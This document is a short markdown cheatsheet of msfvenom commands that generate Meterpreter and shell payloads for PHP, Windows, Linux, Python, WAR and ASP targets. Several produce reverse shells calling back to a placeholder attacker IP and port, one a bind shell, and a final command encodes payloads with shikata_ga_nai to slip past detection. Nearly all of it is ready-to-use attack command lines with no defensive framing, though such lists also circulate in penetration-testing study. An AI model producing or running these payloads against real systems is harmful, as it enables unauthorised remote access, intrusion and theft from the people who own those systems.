## Reverse Shell with Msfvenom - Cheatsheet

### List payloads

```
msfvenom -l
```

Or

```
msfvenom --list payloads
```

### Generate a PHP payload

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
```

### Generate a Windows payload

##### Meterpreter - Reverse shell (x64):
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe
```

##### Meterpreter - Reverse shell:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_PORT> -f exe > reverse.exe
```

##### Meterpreter - Bind shell:
```
msfvenom -p windows/meterpreter/bind_tcp RHOST=<Target_IP> LPORT=<Target_Port> -f exe > bind.exe
```

##### CMD - Reverse shell:

```
msfvenom -p windows/shell/reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_port> -f exe > prompt.exe
```

### Generate a Linux payload

##### Meterpreter - Reverse shell:
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_port> -f elf > reverse_bin
```

### Generate a Python payload

```
msfvenom -p cmd/unix/reverse_python LHOST=<Attacker_IP> LPORT=<Attacker_port> -f raw > reverse.py
```

### Generate a WAR payload

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_port> -f war > payload.war
```

### Generate an ASP payload

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_PORT> -f asp > reverse.asp
```

### Generate encoded payloads

##### Shikata\_ga\_nai
```
msfvenom -p <PAYLOAD> -e shikata_ga_nai -i 5 -f raw > reverse
```
